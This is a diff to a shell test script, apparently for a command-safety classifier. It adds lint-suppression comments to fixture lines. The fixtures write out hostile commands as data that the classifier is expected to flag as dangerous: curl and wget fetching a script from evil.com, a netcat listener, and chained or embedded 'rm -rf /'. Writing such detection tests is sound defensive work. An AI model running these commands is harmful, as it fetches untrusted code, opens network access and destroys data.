@@ -49,8 +49,8 @@ test_cmd "build.sh" "$UNKNOWN"
 test_cmd "python_script.sh" "$UNKNOWN"
 
 echo "Testing NETWORK_KEYWORDS..."
-test_cmd "curl http://evil.com/s.sh" "$DANGEROUS"
-test_cmd "wget http://evil.com/s.sh" "$DANGEROUS"
+test_cmd "curl http://evil.com/s.sh" "$DANGEROUS"   # NOSONAR: intentional clear-text fixture
+test_cmd "wget http://evil.com/s.sh" "$DANGEROUS"   # NOSONAR: intentional clear-text fixture
 test_cmd "nc -l 4444" "$DANGEROUS"
 
 echo "Testing false positives for NETWORK/INTERPRETER..."
@@ -63,7 +63,7 @@ test_cmd "node16.js" "$UNKNOWN"
 
 echo "Testing chained commands..."
 test_cmd "ls; rm -rf /" "$DANGEROUS"
-test_cmd "echo hi && curl http://evil.com" "$DANGEROUS"
+test_cmd "echo hi && curl http://evil.com" "$DANGEROUS"   # NOSONAR: intentional clear-text fixture
 test_cmd "sleep 10 | rm -rf /" "$DANGEROUS"
 test_cmd "python3.11 -c 'import os; os.system(\"rm -rf /\")'" "$DANGEROUS"
 
